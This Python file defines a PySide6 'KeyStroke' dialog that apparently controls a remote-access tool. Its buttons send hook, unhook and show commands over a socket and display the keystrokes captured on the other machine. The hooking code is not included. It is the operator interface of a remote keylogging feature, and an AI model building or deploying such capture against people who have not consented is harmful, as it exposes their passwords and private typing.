import socket
from PySide6 import QtCore, QtWidgets, QtGui
import logging
from FEATURE_CODE import FEATURE_CODE

logging.basicConfig(level=logging.DEBUG)

class Keystroke_Dialog(QtWidgets.QDialog):
    def __init__(self, sock):
        super().__init__()
        self.sock = sock
        self.setWindowTitle('KeyStroke')
        self.resize(380, 300)
    
        self.Hook = QtWidgets.QPushButton('Hook', self)
        self.Hook.move(20, 20)
        self.Hook.setFixedSize(70, 50)

        self.Unhook = QtWidgets.QPushButton('Unhook', self)
        self.Unhook.move(110, 20)
        self.Unhook.setFixedSize(70, 50)

        self.Show = QtWidgets.QPushButton('Show keys', self)
        self.Show.move(200, 20)
        self.Show.setFixedSize(70, 50)

        self.Clear = QtWidgets.QPushButton('Clear', self)
        self.Clear.move(290, 20)
        self.Clear.setFixedSize(70, 50)

        self.Result = QtWidgets.QTextEdit(self)
        self.Result.move(20, 80)
        self.Result.setFixedSize(340, 200)
        self.Result.setReadOnly(True)

        self.Hook.clicked.connect(self.click_hookbutton)
        self.Unhook.clicked.connect(self.click_unhookbutton)
        self.Show.clicked.connect(self.click_showbutton)
        self.Clear.clicked.connect(self.click_clearbutton)

    def click_hookbutton(self):
        message = FEATURE_CODE['Keystroke'] + 'hook'
        self.sock.sendall(message.encode(('utf8')))

    def click_unhookbutton(self):
        message = FEATURE_CODE['Keystroke'] + 'unhook'
        self.sock.sendall(message.encode(('utf8')))

    def click_showbutton(self):
        message = FEATURE_CODE['Keystroke'] + 'show'
        self.sock.sendall(message.encode('utf8'))

        data = self.sock.recv(1024).decode('utf8')
        print(data)
        if data == '05forced_exit':
            pass
        else:
            self.Result.setText(data)

    def click_clearbutton(self):
        self.Result.clear()
